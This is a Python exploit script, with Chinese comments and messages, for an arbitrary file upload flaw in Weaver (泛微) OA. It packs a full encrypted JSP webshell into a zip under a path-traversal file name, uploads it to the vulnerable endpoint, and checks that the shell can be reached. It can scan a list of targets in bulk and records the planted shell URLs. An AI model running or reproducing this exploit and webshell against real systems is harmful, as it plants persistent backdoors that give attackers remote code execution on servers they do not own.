#!/usr/bin/python3
#-*- coding:utf-8 -*-

import argparse
import zipfile
import random
import string
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def header():
	print('\033[32m!***********************************************!\033[0m')
	print('\033[32m!      description:泛微OA任意文件上传漏洞    !\033[0m')
	print('\033[32m!             Author:Fly_Wuhoo                  !\033[0m')
	print('\033[32m!***********************************************!\033[0m')

def Write_Results(url):
	with open('results.txt','a+') as wp:
		wp.write(url+'\n')

def Arg_Parse():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",metavar='',help="目标url地址")
	parser.add_argument("-f","--file",metavar='',help="目标地址文件")
	args = parser.parse_args()
	return args

def Detect(url):
	vuln_url=url+"/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
	shell="""<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>"""
	shell_name = ''.join(random.sample(string.ascii_letters + string.digits, 6))
	with zipfile.ZipFile(shell_name+'.zip', "w", zipfile.ZIP_DEFLATED) as zf:
		zf.writestr('../../../'+shell_name+'.jsp', shell)
	files=[('file', (shell_name+'.zip', open(shell_name+ '.zip', 'rb'), 'application/zip'))]
	shell_url=url+"/cloudstore/"+shell_name+'.jsp'
	print("\033[32m正在检测:{}\033[0m".format(url))
	try:
		response=requests.post(url=vuln_url,files=files,verify=False,timeout=5)
		if response.status_code==200:
			try:
				r=requests.get(url=shell_url)
				if r.status_code==200:
					print("\033[31m文件上传成功\nshell地址是：{}！！！\033[0m".format(shell_url))	 
					if key:
						Write_Results(shell_url)
					else:
						pass
				else:
					print("\033[32m{}访问上传文件失败！！！ \033[0m".format(url))
			except:
				print("\033[32m{}访问上传文件失败！！！ \033[0m".format(url))
		else:
			print("\033[32m{}文件上传失败！！！ \033[0m".format(url))

	except:
		print("\033[32m{}访问失败！！！ \033[0m".format(url))
		
if __name__ == '__main__':
	args = Arg_Parse()
	header()
	if args.url:
		key=0
		Detect(args.url)	
	elif args.file:
		key=1
		with open(args.file,'r') as fp:
			for line in fp.readlines():
				Detect(line.strip())
	else:
		print("\033[33m输入的参数有误，请使用-h参数查看脚本用法 \033[0m")